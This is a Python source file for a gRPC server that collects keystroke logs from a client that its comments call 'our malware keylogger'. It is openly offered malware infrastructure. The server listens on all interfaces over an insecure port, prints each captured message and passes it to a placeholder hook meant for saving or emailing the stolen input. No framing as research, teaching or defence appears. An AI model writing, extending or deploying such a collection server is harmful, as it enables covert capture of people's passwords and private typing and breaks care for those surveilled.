import grpc
from concurrent import futures
from .protos import server_pb2 as keylog_pb2
from .protos import server_pb2_grpc as keylog_pb2_grpc
# here goes the grpc server side code where we can change the action fired by the client (which is our malware keylogger)

# triggred action def
def firedTHread(receivedMessage):
    print("Action fired for message:", receivedMessage)
    # here you can add any action you want to perform when a keylog is received
    # for example, save to file, send email, etc.

class KeylogServer(keylog_pb2_grpc.KeylogServiceServicer):
    def SendKeylog(self, request, context):
        print("Received:", request.message)
        firedTHread(request.message)
        return keylog_pb2.KeylogResponse(response=True)
    
    def serve(self, host="0.0.0.0", port=50051):
        """Start the gRPC server"""
        server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
        keylog_pb2_grpc.add_KeylogServiceServicer_to_server(self, server)
        server.add_insecure_port(f"{host}:{port}")
        print(f"[*] gRPC Server starting on {host}:{port}")
        server.start()
        server.wait_for_termination()

# Only run server if this file is executed directly
if __name__ == "__main__":
    server_instance = KeylogServer()
    server_instance.serve()
